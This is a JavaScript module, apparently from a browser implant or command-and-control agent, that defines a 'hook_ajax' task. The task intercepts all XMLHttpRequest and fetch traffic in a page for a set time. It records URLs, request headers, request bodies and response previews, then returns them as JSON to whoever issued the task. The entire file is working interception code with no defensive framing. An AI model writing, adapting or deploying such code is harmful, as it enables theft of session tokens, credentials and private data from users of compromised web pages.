COMMANDS['hook_ajax'] = async function(task) {
    var params = task.parameters;
    if (typeof params === 'string') {
        try { params = JSON.parse(params); } catch (e) { params = {}; }
    }
    var duration = (params && params.duration) ? parseInt(params.duration) : 60;

    var captured = [];

    // --- Hook XMLHttpRequest ---
    var origOpen = XMLHttpRequest.prototype.open;
    var origSend = XMLHttpRequest.prototype.send;
    var origSetHeader = XMLHttpRequest.prototype.setRequestHeader;

    XMLHttpRequest.prototype.open = function(method, url) {
        this._hookMethod = method;
        this._hookUrl = url;
        this._hookHeaders = {};
        return origOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
        if (this._hookHeaders) this._hookHeaders[name] = value;
        return origSetHeader.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function(body) {
        var entry = {
            ts: new Date().toISOString(),
            type: 'XHR',
            method: this._hookMethod,
            url: this._hookUrl,
            requestHeaders: this._hookHeaders || {},
            requestBody: null
        };
        if (body) {
            var bodyStr = (typeof body === 'string') ? body : '[binary]';
            entry.requestBody = bodyStr.length > 2000 ? bodyStr.substring(0, 2000) + '...' : bodyStr;
        }

        var self = this;
        this.addEventListener('load', function() {
            entry.status = self.status;
            entry.responseLength = self.responseText ? self.responseText.length : 0;
            entry.responsePreview = self.responseText ? self.responseText.substring(0, 500) : '';
            captured.push(entry);
        });
        this.addEventListener('error', function() {
            entry.status = 'error';
            captured.push(entry);
        });

        return origSend.apply(this, arguments);
    };

    // --- Hook fetch ---
    var origFetch = window.fetch;
    window.fetch = function(input, init) {
        var url = (typeof input === 'string') ? input : (input.url || String(input));
        var method = (init && init.method) ? init.method : 'GET';
        var entry = {
            ts: new Date().toISOString(),
            type: 'fetch',
            method: method.toUpperCase(),
            url: url,
            requestHeaders: {},
            requestBody: null
        };

        if (init && init.headers) {
            try {
                if (init.headers instanceof Headers) {
                    init.headers.forEach(function(v, k) { entry.requestHeaders[k] = v; });
                } else {
                    entry.requestHeaders = init.headers;
                }
            } catch (e) {}
        }
        if (init && init.body) {
            var bodyStr = (typeof init.body === 'string') ? init.body : '[binary]';
            entry.requestBody = bodyStr.length > 2000 ? bodyStr.substring(0, 2000) + '...' : bodyStr;
        }

        return origFetch.apply(this, arguments).then(function(resp) {
            entry.status = resp.status;
            // Clone to read body without consuming
            var clone = resp.clone();
            clone.text().then(function(t) {
                entry.responseLength = t.length;
                entry.responsePreview = t.substring(0, 500);
            }).catch(function() {});
            captured.push(entry);
            return resp;
        }).catch(function(err) {
            entry.status = 'error: ' + err.message;
            captured.push(entry);
            throw err;
        });
    };

    // Wait for duration
    await new Promise(function(resolve) {
        setTimeout(resolve, duration * 1000);
    });

    // Restore originals
    XMLHttpRequest.prototype.open = origOpen;
    XMLHttpRequest.prototype.send = origSend;
    XMLHttpRequest.prototype.setRequestHeader = origSetHeader;
    window.fetch = origFetch;

    return JSON.stringify({
        duration: duration + 's',
        intercepted: captured.length,
        requests: captured
    }, null, 2);
};
